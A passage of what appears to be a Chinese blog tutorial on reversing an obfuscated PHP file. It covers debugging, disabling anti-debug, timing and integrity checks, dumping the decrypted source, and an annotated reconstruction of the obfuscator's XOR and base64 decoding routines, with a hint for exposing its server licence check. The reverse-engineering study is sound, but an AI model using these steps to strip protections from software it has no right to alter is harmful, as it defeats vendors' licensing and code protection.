= <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);</span><br><span class="line">file_put_contents(<span class="string">'index2.php'</span>, $prettyCode);</span><br></pre></td></tr></table></figure></div><p>然后执行命令 <code>php format.php</code><br>然后将新生成的文件，以 <code>Western (ISO 8859-1)</code> 编码形式打开，这样可以显示更多非可显示字符而不是多字节的字符集</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" data-fancybox="group" data-caption="decode2" class="fancybox"><img alt="decode2" title="decode2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" class="lazyload"></a></p><hr><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>开头两行需要先注释掉，防止调试过程出现一些问题</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div><p>使用 <code>VSCode</code> 的调试功能，我们可以方便的查看变量的具体内容。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" data-fancybox="group" data-caption="decode3" class="fancybox"><img alt="decode3" title="decode3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" class="lazyload"></a></p><hr><h3 id="33行"><a href="#33行" class="headerlink" title="33行"></a>33行</h3><p>直到调试到这一行，发现直接跳出了。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" data-fancybox="group" data-caption="decode4" class="fancybox"><img alt="decode4" title="decode4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_sapi_name() == <span class="string">'cli'</span> ? <span class="keyword">die</span>() : <span class="string">''</span>;</span><br></pre></td></tr></table></figure></div><p>因为是用命令行运行调试，所以执行完这一句，程序就结束了。<br>然后将这一行注释掉，在他下面下断点。重新运行程序。</p><hr><p>34行是就是读取当前文件，这句话没有什么问题。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$f = file_get_contents(constant(<span class="string">'jnggfmpt'</span>));</span><br></pre></td></tr></table></figure></div><p>然后就又是验证运行环境。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'SERVER_ADDR'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" data-fancybox="group" data-caption="decode5" class="fancybox"><img alt="decode5" title="decode5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" class="lazyload"></a></p><h3 id="然后看后面的-38-42行代码"><a href="#然后看后面的-38-42行代码" class="headerlink" title="然后看后面的 38-42行代码"></a>然后看后面的 38-42行代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">argc = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - argc &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>查了下，是用来防止下断点调试的，如果下断点调试，这里就超过 100 毫秒，然后就退出了。<br>因此决定直接在这条语句之后下断点，让代码一连串执行完，这样就不会超过 100 毫秒了,直接注释掉也行<br>然后再来看一下后面43行这个 <code>eval</code><br>回显结果跑到了71行这里</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" data-fancybox="group" data-caption="decode6" class="fancybox"><img alt="decode6" title="decode6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" class="lazyload"></a></p><p>看起来好像没什么帮助，注释掉之后</p><h3 id="看44行"><a href="#看44行" class="headerlink" title="看44行"></a>看44行</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure></div><p>用来校验数据完整性的代码，这里的 <code>$undefined1</code> 和 <code>$undefined2</code> 都没有定义。如果验证失败，就会调用 <code>$undefined1</code> 会直接 <code>Error</code> 退出程序。而如果验证成功，虽然 <code>$undefined2</code> 变量不存在，但是只是一个 <code>Warning</code>，没有太大问题。</p><p>其中的 <code>decode_func</code> 就是加密代码中最后一个函数，专门负责字符串解码的。<br>验证方法就是把文件尾部分解密和前面的文件主体部分的 md5 对比，这次执行肯定又不能通过。<br>退出程序，注释掉，再重新运行。</p><hr><h3 id="47行找到关键性代码"><a href="#47行找到关键性代码" class="headerlink" title="47行找到关键性代码"></a>47行找到关键性代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$decrypted = str_rot13(@gzuncompress(decode_func(substr($f, <span class="number">-1522</span>, <span class="number">-46</span>))));</span><br></pre></td></tr></table></figure></div><p>同时可以看到已经 <code>return</code> 加密前的代码了，上述的 <code>-1522</code>就是最先提到的加密代码末尾 <code>?&gt;</code> 后的第一个字符</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" data-fancybox="group" data-caption="decode7" class="fancybox"><img alt="decode7" title="decode7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" class="lazyload"></a></p><h3 id="然后跳到最后"><a href="#然后跳到最后" class="headerlink" title="然后跳到最后"></a>然后跳到最后</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$f_varname = <span class="string">'_f_'</span>;</span><br><span class="line">$decrypted = check_and_decrypt($&#123;$f_varname&#125;);</span><br><span class="line">set_include_path(dirname($&#123;$f_varname&#125;));</span><br><span class="line">$base64_encoded_decrypted = base64_encode($decrypted);</span><br><span class="line">$eval_string = <span class="string">'eval(base64_decode($base64_encoded_decrypted));'</span>;</span><br><span class="line">$result = <span class="keyword">eval</span>($eval_string);</span><br><span class="line">set_include_path(dirname($&#123;$f_varname&#125;));</span><br><span class="line"><span class="keyword">return</span> $result;</span><br></pre></td></tr></table></figure></div><p>怎么打印出来呢<br>直接在 <code>$decrypted</code> 后面加上一行 <code>file_put_contents</code> 就可以了。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" data-fancybox="group" data-caption="decode7_2" class="fancybox"><img alt="decode7_2" title="decode7_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" class="lazyload"></a></p><p>然后便可以看到解密后的源码</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" data-fancybox="group" data-caption="decode8" class="fancybox"><img alt="decode8" title="decode8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" class="lazyload"></a></p><p>如果将上述的 35行 <code>server_host</code> 改成 <code>&#39;127.0.0.1&#39;</code> 还可以看到服务器返回的请求验证数据代码</p><h3 id="50行-decode-func"><a href="#50行-decode-func" class="headerlink" title="50行 decode_func"></a>50行 decode_func</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" data-fancybox="group" data-caption="decode9" class="fancybox"><img alt="decode9" title="decode9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" class="lazyload"></a></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>感谢 <a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">Ganlv 师傅</a> 的一路指导</p><h3 id="大致的加密源码"><a href="#大致的加密源码" class="headerlink" title="大致的加密源码"></a>大致的加密源码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先把这两行去掉，防止出现什么问题，我们还什么都不知道。</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="comment">// ini_set("display_errors", 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'jnggfmpt'</span>)) &#123;</span><br><span class="line">    define(<span class="string">'jnggfmpt'</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (function_exists(<span class="string">'func2'</span>) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 第一个函数返回 'base64_decode' ，这个函数不依赖其他任何函数，单纯地返回一个字符串 'base64_decode'。</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $v1 = <span class="string">'6f6e66723634'</span>;</span><br><span class="line">            $v2 = <span class="string">'pa'</span>;</span><br><span class="line">            $v3 = <span class="string">'7374725f'</span>;</span><br><span class="line">            $v4 = <span class="string">'H'</span> . <span class="string">'*'</span>;</span><br><span class="line">            $v2 .= <span class="string">'ck'</span>; <span class="comment">// $v2 = 'pack';</span></span><br><span class="line">            $v1 .= <span class="string">'5f717270627172'</span>; <span class="comment">// $v1 = '6f6e667236345f717270627172';</span></span><br><span class="line">            $v3 .= <span class="string">'726f743133'</span>; <span class="comment">// $v3 = '7374725f726f743133';</span></span><br><span class="line">            <span class="comment">// $v5 = $v2($v4, $v3);</span></span><br><span class="line">            $v5 = pack(<span class="string">'H*'</span>, <span class="string">'7374725f726f743133'</span>);</span><br><span class="line">            <span class="comment">// $v5 = 'str_rot13';</span></span><br><span class="line">            <span class="comment">// $v6 = $v5($v2($v4, $v1));</span></span><br><span class="line">            $v6 = str_rot13(pack(<span class="string">'H*'</span>, <span class="string">'6f6e667236345f717270627172'</span>));</span><br><span class="line">            <span class="comment">// $v6 = 'base64_decode';</span></span><br><span class="line">            <span class="keyword">return</span> $v6;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二个函数接受两个参数，要注意第一个参数还是一个引用参数。</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func2</span><span class="params">(&amp;$arg1, $arg2)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 第一句是令一堆变量等于 func4</span></span><br><span class="line">            <span class="comment">// $v1 - $v5 都使用 func4 解码一个字符串，结果如下</span></span><br><span class="line">            $v1 = <span class="string">'str_rot13'</span>;</span><br><span class="line">            $v2 = <span class="string">'strrev'</span>;</span><br><span class="line">            $v3 = <span class="string">'gzuncompress'</span>;</span><br><span class="line">            $v4 = <span class="string">'stripslashes'</span>;</span><br><span class="line">            $v5 = <span class="string">'explode'</span>;</span><br><span class="line">            <span class="comment">// $v6 = $v1($v2($v3($v4(func4('??????')))));</span></span><br><span class="line">            <span class="comment">// $v6 = str_rot13(strrev(gzuncompress(stripslashes(func4('??????')))));</span></span><br><span class="line">            $v6 = <span class="string">',chr,addslashes,rand,gzuncompress,assert_options,assert,file_get_contents,substr,unpack,constant,strpos,create_function,str_rot13,md5,set_include_path,dirname,preg_replace,base64_encode,base64_decode,'</span>;</span><br><span class="line">            <span class="comment">// $v7 = $v5($v6);</span></span><br><span class="line">            <span class="comment">// $v7 = explode($v6);</span></span><br><span class="line">            $v7 = <span class="keyword">array</span>(</span><br><span class="line">                <span class="number">0</span> =&gt; <span class="string">""</span>,</span><br><span class="line">                <span class="number">1</span> =&gt; <span class="string">"chr"</span>,</span><br><span class="line">                <span class="number">2</span> =&gt; <span class="string">"addslashes"</span>,</span><br><span class="line">                <span class="number">3</span> =&gt; <span class="string">"rand"</span>,</span><br><span class="line">                <span class="number">4</span> =&gt; <span class="string">"gzuncompress"</span>,</span><br><span class="line">                <span class="number">5</span> =&gt; <span class="string">"assert_options"</span>,</span><br><span class="line">                <span class="number">6</span> =&gt; <span class="string">"assert"</span>,</span><br><span class="line">                <span class="number">7</span> =&gt; <span class="string">"file_get_contents"</span>,</span><br><span class="line">                <span class="number">8</span> =&gt; <span class="string">"substr"</span>,</span><br><span class="line">                <span class="number">9</span> =&gt; <span class="string">"unpack"</span>,</span><br><span class="line">                <span class="number">10</span> =&gt; <span class="string">"constant"</span>,</span><br><span class="line">                <span class="number">11</span> =&gt; <span class="string">"strpos"</span>,</span><br><span class="line">                <span class="number">12</span> =&gt; <span class="string">"create_function"</span>,</span><br><span class="line">                <span class="number">13</span> =&gt; <span class="string">"str_rot13"</span>,</span><br><span class="line">                <span class="number">14</span> =&gt; <span class="string">"md5"</span>,</span><br><span class="line">                <span class="number">15</span> =&gt; <span class="string">"set_include_path"</span>,</span><br><span class="line">                <span class="number">16</span> =&gt; <span class="string">"dirname"</span>,</span><br><span class="line">                <span class="number">17</span> =&gt; <span class="string">"preg_replace"</span>,</span><br><span class="line">                <span class="number">18</span> =&gt; <span class="string">"base64_encode"</span>,</span><br><span class="line">                <span class="number">19</span> =&gt; <span class="string">"base64_decode"</span>,</span><br><span class="line">                <span class="number">20</span> =&gt; <span class="string">""</span>,</span><br><span class="line">            );</span><br><span class="line">            $arg1 = $v7[$arg2];</span><br><span class="line">            <span class="comment">// 看到这里知道了，这个函数就是用来需要用的提取函数名的</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第三个函数被主程序调用了</span></span><br><span class="line">        <span class="comment">// 不过分析之后发现这个 $arg1 参数并没有用到</span></span><br><span class="line">        <span class="comment">// 这个函数的前半部分是防止调试</span></span><br><span class="line">        <span class="comment">// 后半部分是提取后面加密的代码</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func3</span><span class="params">($arg1)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $_v1, <span class="comment">// $_v1 = 'file_get_contents';</span></span><br><span class="line">            $_v3, <span class="comment">// $_v3 = 'substr';</span></span><br><span class="line">            $_v4, <span class="comment">// $_v4 = 'assert';</span></span><br><span class="line">            $_v5, <span class="comment">// $_v5 = 'assert_options';</span></span><br><span class="line">            $_v6, <span class="comment">// $_v6 = 'unpack';</span></span><br><span class="line">            $_v7, <span class="comment">// $_v7 = 'constant';</span></span><br><span class="line">            $_v8, <span class="comment">// $_v8 = 'preg_replace';</span></span><br><span class="line">            $_v9, <span class="comment">// $_v9 = 'base64_encode';</span></span><br><span class="line">            $_v10, <span class="comment">// $_v10 = 'gzuncompress';</span></span><br><span class="line">            $_v11, <span class="comment">// $_v11 = 'create_function';</span></span><br><span class="line">            $_v12, <span class="comment">// $_v12 = 'strpos';</span></span><br><span class="line">            $_v13, <span class="comment">// $_v13 = 'addslashes';</span></span><br><span class="line">            $_v14, <span class="comment">// $_v14 = 'str_rot13';</span></span><br><span class="line">            $_v15, <span class="comment">// $_v15 = 'md5';</span></span><br><span class="line">            $_v16, <span class="comment">// $_v16 = 'set_include_path';</span></span><br><span class="line">            $_v17; <span class="comment">// $_v17 = 'dirname';</span></span><br><span class="line">            <span class="comment">// 这里有一堆变量等于 func4，然后用他们解码得到 $v1 - $v5</span></span><br><span class="line">            $v1 = <span class="string">'php_sapi_name'</span>;</span><br><span class="line">            $v2 = <span class="string">'die'</span>;</span><br><span class="line">            $v3 = <span class="string">'cli'</span>;</span><br><span class="line">            $v4 = <span class="string">'microtime'</span>;</span><br><span class="line">            $v5 = <span class="string">'1000'</span>;</span><br><span class="line">            <span class="comment">// $v1() == $v3 ? $v2() : '';</span></span><br><span class="line">            <span class="comment">// 这句话在调试的时候需要注释掉</span></span><br><span class="line">            php_sapi_name() == <span class="string">'cli'</span> ? <span class="keyword">die</span>() : <span class="string">''</span>;</span><br><span class="line">            <span class="comment">// file_get_contents(constant(func4('??????')));</span></span><br><span class="line">            $v7 = file_get_contents(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="comment">// $v8 = $v4(true) * $v5;</span></span><br><span class="line">            $v8 = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line">            <span class="comment">// if ($v4(true) * $v5 - $v8 &gt; 100) &#123;</span></span><br><span class="line">            <span class="comment">// 这里是防止下断点调试的，下断点调试，这里就超过 100 毫秒了，直接注释掉</span></span><br><span class="line">            <span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - $v8 &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="comment">// $v2();</span></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// eval(func4('??????'));</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'if(strpos(__FILE__, msvigqgq) !== 0)&#123;$exitfunc();&#125;'</span>);</span><br><span class="line">            <span class="comment">// $_v12(func4($_v3($v7, func4('??????'), func4('??????'))), $_v15($_v3($v7, func4('??????'), func4('??????')))) ? $v9() : $v10;</span></span><br><span class="line">            <span class="comment">// 这里的 $v9 和 $v10 都没有定义，如果验证失败，就会调用 $v9 会直接出错退出程序</span></span><br><span class="line">            <span class="comment">// 而如果验证成功 $v10 变量不存在则没问题</span></span><br><span class="line">            <span class="comment">// 验证方法就是把文件尾部分解密和前面的文件主体部分的md5对比，直接注释掉</span></span><br><span class="line">            !strpos(func4(substr($v7, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($v7, <span class="number">0</span>, <span class="number">-46</span>))) ? $v9() : $v10;</span><br><span class="line">            <span class="comment">// 这两个数值是通过 func4 解码得到的</span></span><br><span class="line">            $v11 = <span class="string">'-2586'</span>;</span><br><span class="line">            $v12 = <span class="string">'-46'</span>;</span><br><span class="line">            <span class="comment">// $v12 = $_v14(@$_v10(func4(substr($v7, $v11, $v12))));</span></span><br><span class="line">            $v12 = str_rot13(@gzuncompress(func4(substr($v7, $v11, $v12))));</span><br><span class="line">            <span class="keyword">return</span> $v12;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第四个函数有点复杂，这是一个解码函数，用的是异或算法解密，所有调用 func4 的位置都没有提供 $arg2</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func4</span><span class="params">($arg1, $arg2 = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $v1 = <span class="string">'base64_decode'</span>;</span><br><span class="line">            <span class="comment">// $v2 - $v4 通过 base64_decode 解码得到</span></span><br><span class="line">            $v2 = <span class="string">'ord'</span>;</span><br><span class="line">            $v3 = <span class="string">'strlen'</span>;</span><br><span class="line">            $v4 = <span class="string">'chr'</span>;</span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? $v2('?') : $arg2;</span></span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? 136 : $arg2;</span></span><br><span class="line">            $arg2 = <span class="number">136</span>;</span><br><span class="line">            <span class="comment">// 这里 $v5 不存在，所以 $v6 = null;</span></span><br><span class="line">            $v6 = $v5;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($arg1); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; $v6 &lt; strlen($arg1); $v6++) &#123;</span><br><span class="line">                <span class="comment">// $v7 .= $v2($arg1[$v6]) &lt; $v2('?') ? $v2($arg1[$v6]) &gt; $arg2 &amp;&amp; $v2($arg1[$v6]) &lt; 245 ? $v4($v2($arg1[$v6]) / 2) : $arg1[$v6] : '';</span></span><br><span class="line">                $v7 .= ord($arg1[$v6]) &lt; <span class="number">245</span> ? ord($arg1[$v6]) &gt; $arg2 &amp;&amp; ord($arg1[$v6]) &lt; <span class="number">245</span> ? chr(ord($arg1[$v6]) / <span class="number">2</span>) : $arg1[$v6] : <span class="string">''</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// $v8 = $v1($v7);</span></span><br><span class="line">            $v8 = base64_decode($v7);</span><br><span class="line">            $v9 = <span class="string">'md5'</span>; <span class="comment">// $v9 通过 base64_decode 解码得到</span></span><br><span class="line">            $v6 = $v5;</span><br><span class="line">            <span class="comment">// $arg2 = $v9('8_Q.L2');</span></span><br><span class="line">            <span class="comment">// $arg2 = md5('8_Q.L2');</span></span><br><span class="line">            $arg2 = <span class="string">'fac02565267d815643cecee75a16c7bd'</span>;</span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = $v3($arg2);</span></span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = strlen($arg2);</span></span><br><span class="line">            $v10 = $ctrmax = <span class="number">32</span>;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($v8); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; $v6 &lt; strlen($v8); $v6++) &#123;</span><br><span class="line">                $v10 = $v10 ? $v10 : $ctrmax;</span><br><span class="line">                $v10--;</span><br><span class="line">                $v11 .= $v8[$v6] ^ $arg2[$v10];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $v11;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $_v1, <span class="comment">// $_v1 = 'file_get_contents';</span></span><br><span class="line">$_v2, <span class="comment">// $_v2 = 'chr';</span></span><br><span class="line">$_v3, <span class="comment">// $_v3 = 'substr';</span></span><br><span class="line">$_v4, <span class="comment">// $_v4 = 'assert';</span></span><br><span class="line">$_v5, <span class="comment">// $_v5 = 'assert_options';</span></span><br><span class="line">$_v6, <span class="comment">// $_v6 = 'unpack';</span></span><br><span class="line">$_v7, <span class="comment">// $_v7 = 'constant';</span></span><br><span class="line">$_v8, <span class="comment">// $_v8 = 'preg_replace';</span></span><br><span class="line">$_v9, <span class="comment">// $_v9 = 'base64_encode';</span></span><br><span class="line">$_v10, <span class="comment">// $_v10 = 'gzuncompress';</span></span><br><span class="line">$_v11, <span class="comment">// $_v11 = 'create_function';</span></span><br><span class="line">$_v12, <span class="comment">// $_v12 = 'strpos';</span></span><br><span class="line">$_v13, <span class="comment">// $_v13 = 'addslashes';</span></span><br><span class="line">$_v14, <span class="comment">// $_v14 = 'str_rot13';</span></span><br><span 